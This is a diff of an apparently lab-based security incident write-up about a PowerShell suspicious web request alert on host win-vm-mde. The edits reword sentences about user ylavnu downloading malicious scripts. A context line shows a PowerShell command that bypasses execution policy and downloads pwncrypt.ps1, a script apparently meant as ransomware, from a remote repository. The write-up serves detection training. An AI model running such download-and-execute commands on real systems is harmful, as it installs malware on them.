@@ -72,7 +72,7 @@ After the rule was created, we see five entities: the host machine `win-vm-mde` 
 ![image](https://github.com/user-attachments/assets/8c279499-9b01-4a37-83e8-18bef1064964)
 
 
-Upon investigating the triggered incident `Alert PowerShell Suspicious Web Request Rule`, the user `ylavnu` downloaded 4 different scripts with 4 different commands on the host machine `win-vm-mde`. The following commands were
+Upon investigating the triggered incident `Alert PowerShell Suspicious Web Request Rule`, 4 different script commands were found.
 
 `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
 
@@ -93,7 +93,7 @@ Upon investigating the triggered incident `Alert PowerShell Suspicious Web Reque
 
 ![image](https://github.com/user-attachments/assets/4adb0e5b-62cd-473a-95e0-616095f5e3f3)
 
-It was determined that the user `ylavnu` downloaded the malicious PowerShell scripts and executed them. The scripts were then passed off to the malware reverse engineering team. Here are the short descriptions for each script:
+It was determined that the user `ylavnu` downloaded 4 different malicious PowerShell scripts with 4 different commands on the host machine `win-vm-mde`. The scripts were then passed off to the malware reverse engineering team. Here are the short descriptions for each script:
 
 **portscan.ps1**: Scans a specified range of IP addresses for open ports from a list of common ports and logs the results.
 
